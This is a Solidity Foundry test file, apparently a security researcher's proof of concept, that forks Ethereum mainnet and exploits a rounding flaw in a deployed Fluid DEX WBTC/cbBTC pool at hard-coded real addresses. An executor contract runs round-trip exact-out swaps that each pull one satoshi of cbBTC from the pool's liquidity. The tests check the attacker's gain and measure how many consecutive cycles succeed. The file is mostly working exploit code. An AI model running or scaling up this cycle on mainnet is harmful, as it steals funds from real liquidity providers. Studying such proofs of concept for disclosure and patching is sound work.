// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import { Test } from "forge-std/Test.sol";

interface IERC20BA {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFluidDexExactOut {
    function readFromStorage(bytes32 slot) external view returns (uint256);
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external payable returns (uint256 amountIn);
}

contract WbtcCbbtcCycleExecutor {
    address immutable pool;
    address immutable wbtc;
    address immutable cbbtc;

    constructor(address pool_, address wbtc_, address cbbtc_) {
        pool = pool_;
        wbtc = wbtc_;
        cbbtc = cbbtc_;
        require(IERC20BA(wbtc_).approve(pool_, type(uint256).max), "WBTC_APPROVE");
        require(IERC20BA(cbbtc_).approve(pool_, type(uint256).max), "CBBTC_APPROVE");
    }

    function oneRound(uint256 outCbBtc)
        external returns (uint256 paidWbtc, uint256 paidCbBtc)
    {
        paidWbtc = IFluidDexExactOut(pool).swapOut(
            true, outCbBtc, type(uint256).max, address(this)
        );
        paidCbBtc = IFluidDexExactOut(pool).swapOut(
            false, paidWbtc, type(uint256).max, address(this)
        );
    }
}

contract ActiveWbtcCbbtcRoundingExtractionTest is Test {
    address constant POOL = 0x3C0441B42195F4aD6aa9a0978E06096ea616CDa7;
    address constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    uint256 constant OUT_CBBTC = 101;

    event BitcoinSingleCycleProof(
        uint256 blockNumber,
        uint256 feeRaw,
        uint256 paidWbtc,
        uint256 paidCbBtc,
        int256 attackerDeltaWbtc,
        int256 attackerDeltaCbBtc,
        uint256 liquidityLossCbBtc,
        uint256 gasUsed
    );
    event BitcoinConsecutiveBoundaryProof(
        uint256 blockNumber,
        uint256 successfulRounds,
        int256 attackerDeltaWbtc,
        int256 attackerDeltaCbBtc,
        uint256 liquidityLossCbBtc,
        uint256 gasUsed
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
    }

    function _configuration() internal view returns (uint256 feeRaw) {
        uint256 packed = IFluidDexExactOut(POOL).readFromStorage(bytes32(uint256(1)));
        feeRaw = (packed >> 2) & ((1 << 17) - 1);
        assertEq(feeRaw, 45, "unexpected fee");
        assertEq(packed & 3, 3, "both smart pools should be active");
        assertEq(packed >> 255, 0, "pool paused");
    }

    function _executor() internal returns (WbtcCbbtcCycleExecutor executor) {
        executor = new WbtcCbbtcCycleExecutor(POOL, WBTC, CBBTC);
        deal(WBTC, address(executor), 1_000_000);
    }

    function test_deployedSingleCycleExtractsOneSatCbBtc() public {
        uint256 feeRaw = _configuration();
        WbtcCbbtcCycleExecutor executor = _executor();

        uint256 attackerWbtcBefore = IERC20BA(WBTC).balanceOf(address(executor));
        uint256 attackerCbBtcBefore = IERC20BA(CBBTC).balanceOf(address(executor));
        uint256 liquidityWbtcBefore = IERC20BA(WBTC).balanceOf(LIQUIDITY);
        uint256 liquidityCbBtcBefore = IERC20BA(CBBTC).balanceOf(LIQUIDITY);

        uint256 gasBefore = gasleft();
        (uint256 paidWbtc, uint256 paidCbBtc) = executor.oneRound(OUT_CBBTC);
        uint256 gasUsed = gasBefore - gasleft();

        int256 deltaWbtc = int256(IERC20BA(WBTC).balanceOf(address(executor))) - int256(attackerWbtcBefore);
        int256 deltaCbBtc = int256(IERC20BA(CBBTC).balanceOf(address(executor))) - int256(attackerCbBtcBefore);
        uint256 liquidityWbtcAfter = IERC20BA(WBTC).balanceOf(LIQUIDITY);
        uint256 liquidityCbBtcAfter = IERC20BA(CBBTC).balanceOf(LIQUIDITY);

        assertEq(paidWbtc, 100, "first-leg input");
        assertEq(paidCbBtc, 100, "second-leg input");
        assertEq(deltaWbtc, 0, "initial WBTC not restored");
        assertEq(deltaCbBtc, 1, "expected one sat cbBTC extraction");
        assertEq(liquidityWbtcAfter, liquidityWbtcBefore, "Liquidity WBTC changed");
        assertEq(liquidityCbBtcBefore - liquidityCbBtcAfter, 1, "Liquidity loss");

        emit BitcoinSingleCycleProof(
            block.number, feeRaw, paidWbtc, paidCbBtc, deltaWbtc, deltaCbBtc,
            liquidityCbBtcBefore - liquidityCbBtcAfter, gasUsed
        );
    }

    function test_measureConsecutiveSuccessfulCyclesBeforeBoundary() public {
        _configuration();
        WbtcCbbtcCycleExecutor executor = _executor();

        uint256 attackerWbtcBefore = IERC20BA(WBTC).balanceOf(address(executor));
        uint256 attackerCbBtcBefore = IERC20BA(CBBTC).balanceOf(address(executor));
        uint256 liquidityCbBtcBefore = IERC20BA(CBBTC).balanceOf(LIQUIDITY);
        uint256 successfulRounds;
        uint256 gasBefore = gasleft();

        for (uint256 i; i < 64; ++i) {
            try executor.oneRound(OUT_CBBTC) returns (uint256 paidWbtc, uint256 paidCbBtc) {
                assertEq(paidWbtc, 100, "unexpected WBTC payment");
                assertEq(paidCbBtc, 100, "unexpected cbBTC payment");
                ++successfulRounds;
            } catch {
                break;
            }
        }

        uint256 gasUsed = gasBefore - gasleft();
        int256 deltaWbtc = int256(IERC20BA(WBTC).balanceOf(address(executor))) - int256(attackerWbtcBefore);
        int256 deltaCbBtc = int256(IERC20BA(CBBTC).balanceOf(address(executor))) - int256(attackerCbBtcBefore);
        uint256 liquidityCbBtcAfter = IERC20BA(CBBTC).balanceOf(LIQUIDITY);

        assertGt(successfulRounds, 0, "no successful cycle");
        assertEq(deltaWbtc, 0, "initial WBTC not restored");
        assertEq(deltaCbBtc, int256(successfulRounds), "one sat per successful cycle");
        assertEq(
            liquidityCbBtcBefore - liquidityCbBtcAfter,
            successfulRounds,
            "attacker gain != Liquidity loss"
        );

        emit BitcoinConsecutiveBoundaryProof(
            block.number, successfulRounds, deltaWbtc, deltaCbBtc,
            liquidityCbBtcBefore - liquidityCbBtcAfter, gasUsed
        );
    }
}
